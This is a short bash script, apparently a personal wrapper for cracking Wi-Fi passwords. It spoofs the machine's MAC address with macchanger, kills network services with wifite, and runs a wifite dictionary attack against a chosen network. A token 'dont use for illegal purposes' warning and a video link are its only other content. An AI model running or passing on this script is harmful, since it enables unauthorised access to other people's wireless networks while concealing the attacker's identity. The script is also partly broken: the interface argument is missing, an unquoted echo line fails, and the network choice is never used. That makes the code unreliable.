#!/bin/bash

macchanger -r

echo WARNING: Dont use for illegal purposes!
read warning

wifite --kill

#Choose network
echo Which one? (Enter Num)
read mynet

wifite -dict /usr/share/wordlists/private.txt.gz

#https://www.youtube.com/watch?v=CM_Q1IWNj9o
